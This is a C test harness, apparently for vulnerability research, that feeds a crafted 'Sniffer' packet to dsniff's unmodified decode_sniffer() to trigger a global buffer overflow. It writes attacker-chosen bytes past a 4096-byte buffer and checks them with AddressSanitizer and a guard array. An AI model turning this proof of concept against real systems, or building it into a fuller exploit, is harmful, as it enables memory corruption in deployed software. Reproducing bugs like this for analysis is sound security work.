/*
 * dsniff2shell W204 harness.
 *
 * Calls the UNMODIFIED upstream decode_sniffer() from dsniff v2.5a2 with a
 * crafted "Sniffer" packet. No network: the packet bytes are the only
 * attacker-supplied input. Two builds:
 *   - ASan build: obuf[4096] is a bare global, like trigger.c's obuf, so the
 *     real global-buffer-overflow is reported by AddressSanitizer.
 *   - Guarded build: an adjacent guard array lets the chosen decoded bytes be
 *     read back without ASan stopping at the redzone.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

#include "base64.h"

#define OBUF_LEN 4096
#define GUARD_LEN 8192

#ifdef GUARDED
struct region {
	unsigned char obuf[OBUF_LEN];
	unsigned char guard[GUARD_LEN];
} region;
#define OBUF region.obuf
#else
static unsigned char obuf[OBUF_LEN];
#define OBUF obuf
#endif

int decode_sniffer(u_char *, int, u_char *, int);

static const char b64[] =
	"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void
enc3(const unsigned char *in, char *out)
{
	out[0] = b64[in[0] >> 2];
	out[1] = b64[((in[0] & 3) << 4) | (in[1] >> 4)];
	out[2] = b64[((in[1] & 15) << 2) | (in[2] >> 6)];
	out[3] = b64[in[2] & 63];
}

/*
 * Build a packet with len bytes. Bytes 32..(len-4) are a base64 string whose
 * decoded content is chosen here. Packet length 4199 gives 4164 base64 chars,
 * so snprintf(obuf, 4096, "%s [", ...) truncates to 4095 bytes and
 * olen - strlen(obuf) - 3 == -2. Length 128 is the safe control.
 */
static unsigned char *
make_packet(int *out_len, int safe)
{
	int len = safe ? 128 : 4199;
	int decoded_len = safe ? 60 : 3123;
	unsigned char *dec = calloc(1, decoded_len);
	unsigned char *buf = calloc(1, len + 16);
	int i, j;

	if (dec == NULL || buf == NULL)
		exit(2);

	/* Decoded bytes: byte 0 lands on obuf[4095]; bytes 1+ are OOB. */
	for (i = 0; i < decoded_len; i++)
		dec[i] = 'Z';
	if (!safe) {
		dec[0] = 'A';
		memcpy(&dec[1], "MISHE-OO", 8);
		memcpy(&dec[129], "MISHE-OO", 8);
		dec[137] = 0xab;
	}

	buf[0] = 5;					/* Sniffer record marker */
	buf[6] = 260 & 0xff;				/* opcode 260: capture */
	buf[7] = (260 >> 8) & 0xff;
	for (i = 0, j = 32; i + 2 < decoded_len; i += 3, j += 4)
		enc3(&dec[i], (char *)&buf[j]);
	if (decoded_len % 3 != 0)
		exit(2);

	*out_len = len;
	free(dec);
	return buf;
}

static void
print_guard(const char *label, int offset)
{
#ifdef GUARDED
	int i;
	printf("%s:", label);
	for (i = 0; i < 8; i++)
		printf(" %02x", region.guard[offset + i]);
	printf("\n");
#else
	printf("%s: unavailable in ASan build\n", label);
#endif
}

int
main(int argc, char **argv)
{
	int mode = (argc > 1 && strcmp(argv[1], "safe") == 0) ? 2 :
	    (argc > 1 && strcmp(argv[1], "bytes") == 0) ? 1 : 0;
	int len, ret;
	unsigned char *buf;

#ifdef GUARDED
	memset(region.guard, 0xcd, sizeof(region.guard));
#endif
	buf = make_packet(&len, mode == 2);
	ret = decode_sniffer(buf, len, OBUF, OBUF_LEN);
	printf("decode_sniffer rc=%d len=%d\n", ret, len);
	if (mode == 1) {
		print_guard("guard0", 0);
		print_guard("guard128", 128);
	}
	free(buf);
	return 0;
}
